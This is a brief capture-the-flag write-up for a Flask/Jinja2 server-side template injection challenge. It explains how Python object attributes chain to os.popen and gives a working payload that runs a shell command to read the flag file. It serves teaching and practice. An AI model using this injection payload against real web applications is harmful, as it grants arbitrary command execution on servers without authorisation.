* Category
  * SSTI
  * Jinja2
* Solution
  1. It's written in python Flask which means it uses Jinja2 template server
  2. All things in python are object
  3. ```__class__``` -> current class
  4. ```__base__``` -> parent class
  5. ```_subclasses__``` -> ever sub classes of current class
     * 132: ```os._wrap_close```
  6. ```__init__``` -> init method of current class
  7. ```__globals__``` -> this stores in every method that tells you which global variables are available
     * Since we choose ```os._wrap_close``` as our function, the global variables include every all variables in ```os```, which includes ```system```, ```popen```
* Payload
  1. ```{{"".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cat /th*').read()}}```
* Reference
  *  [```os.system()``` and ```os.popen()```](https://www.itread01.com/content/1547128447.html)
* ```FLAG{ssti.__class__.__pwn__}```
